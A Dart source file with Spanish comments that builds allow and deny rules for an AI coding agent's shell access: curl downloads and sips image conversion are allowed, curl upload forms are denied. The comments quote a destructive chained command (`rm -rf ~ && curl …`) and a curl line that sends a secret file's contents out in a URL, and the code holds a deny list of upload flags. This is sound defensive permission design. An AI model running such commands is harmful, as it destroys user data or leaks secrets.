/// Traduce lo que el usuario escribe a lo que el CLI entiende por permitir.
///
/// **El espejo de [BlockedCommands], y no simétrico a propósito.** Existe
/// porque «puede editar» prometía más de lo que daba: concede `acceptEdits`,
/// que autoriza las herramientas de edición y **ninguna ejecución**. Comprobado
/// lanzándolo: un `curl` queda esperando una aprobación que en headless no
/// llega nunca, así que el archivo no se descargaba y nadie decía por qué.
///
/// Lo que sigue es la diferencia que importa:
///
/// | | bloquear | permitir |
/// |---|---|---|
/// | patrón | `Bash(*x*)` | `Bash(x:*)` |
/// | de más | inofensivo | agujero |
///
/// Bloquear de más deja un comando sin correr; permitir de más deja correr algo
/// que nadie autorizó. Por eso el comodín de bloquear va a los dos lados y el
/// de permitir **solo detrás**: con `Bash(*curl*)` valdría
/// `rm -rf ~ && curl algo`, que contiene «curl» y no se parece en nada a lo que
/// se quiso permitir.
abstract final class AllowedCommands {
  /// Los patrones para `--allowedTools`.
  ///
  /// El prefijo se ancla al principio: escribir `curl` permite `curl …` y nada
  /// más. Quien necesite algo más fino puede escribir el patrón entero —lo que
  /// lleva paréntesis pasa tal cual—, pero entonces lo hace a sabiendas.
  static List<String> patterns(List<String> entries) => [
    for (final raw in entries)
      if (_clean(raw) case final entry? when entry.isNotEmpty)
        if (entry.contains('(')) entry else 'Bash($entry:*)',
  ];

  /// Lo que viene autorizado siempre que la carpeta pueda escribir.
  ///
  /// **`curl` entero, y esto se escribió primero al revés.** La primera versión
  /// permitía solo `Bash(curl -o:*)`, pensando que anclar en `-o` dejaba fuera
  /// la forma que sube archivos. Falló por los dos lados a la vez:
  ///
  /// - **No servía.** Claude escribe `curl -sSL <url> -o destino` —los flags
  ///   delante—, que no empieza por `curl -o`. Medido: la descarga se quedaba
  ///   bloqueada igual, y decirle la forma exacta en el aviso es apoyarse en
  ///   que el modelo teclee un prefijo al pie de la letra.
  /// - **Y no protegía.** `curl -o x "https://donde-sea/?d=$(cat secreto)"`
  ///   empieza por `curl -o` y se llevaba el archivo igual. La estrechez daba
  ///   una sensación de seguridad que no existía.
  ///
  /// Lo que sí es una frontera de verdad está en [loQueNoSube]: negar las
  /// formas que **suben** un archivo. Y hay que decirlo entero: en una carpeta
  /// que puede escribir, la salida a la red ya estaba abierta por `WebFetch`,
  /// así que permitir `curl` no abre una clase nueva de riesgo — abre las
  /// formas de subir, que son justo las que se niegan aquí.
  static const paraDescargar = 'Bash(curl:*)';

  /// Convertir una imagen, con la herramienta que ya trae el Mac.
  ///
  /// Existe porque los Spaces de generación devuelven `.webp` y casi ningún
  /// sitio lo quiere: se pide una imagen y llega en un formato que no se puede
  /// pegar en el diseño. `sips` es de macOS, no toca la red y convierte webp a
  /// png sin instalar nada — comprobado.
  static const paraConvertirImagenes = 'Bash(sips:*)';

  /// Lo que se niega aunque `curl` esté permitido: **lo que sube**.
  ///
  /// La denegación gana al permiso —medido en este repositorio— así que esto
  /// recorta el permiso ancho de arriba en vez de discutir con él.
  ///
  /// Son las formas que mandan un archivo hacia fuera: `-d`, `--data…`, `-T`,
  /// `--upload-file`, `-F`. Descargar sigue funcionando escriba Claude los
  /// flags donde los escriba, que es lo que hacía falta.
  static const loQueNoSube = [
    'Bash(curl * -d *)',
    'Bash(curl * --data*)',
    'Bash(curl * -T *)',
    'Bash(curl * --upload-file*)',
    'Bash(curl * -F *)',
  ];

  /// Lo que se le cuenta a Claude sobre lo que puede correr aquí.
  ///
  /// Ya no dicta la forma exacta del comando —eso era la muleta del permiso
  /// estrecho, y apoyarse en que el modelo teclee un prefijo exacto es
  /// apoyarse en arena—. Dice lo que hay: puede bajar archivos, puede
  /// convertir imágenes, y no puede subir.
  static String? loQuePuedeCorrer(String? loBloqueado) {
    const puede =
        'En esta carpeta puedes descargar archivos con `curl` y convertir '
        'imágenes con `sips` (por ejemplo `sips -s format png entrada.webp '
        '--out salida.png`), sin pedir permiso. Lo que no puedes es **subir** '
        'archivos: las formas de `curl` que mandan un archivo hacia fuera '
        '—`-d`, `-T`, `-F`— están negadas, y no hay que buscarles la vuelta. '
        'Si te piden una imagen y el modelo la devuelve en `.webp`, conviértela '
        'a `.png` antes de darla por hecha.';
    return loBloqueado == null ? puede : '$loBloqueado\n\n$puede';
  }

  /// Se admiten comentarios con `#`, como en los bloqueados: aquí hace todavía
  /// más falta, porque dentro de tres meses lo que no se recuerda es por qué se
  /// abrió esta puerta.
  static String? _clean(String raw) {
    final sinComentario = raw.split('#').first.trim();
    return sinComentario.isEmpty ? null : sinComentario;
  }
}
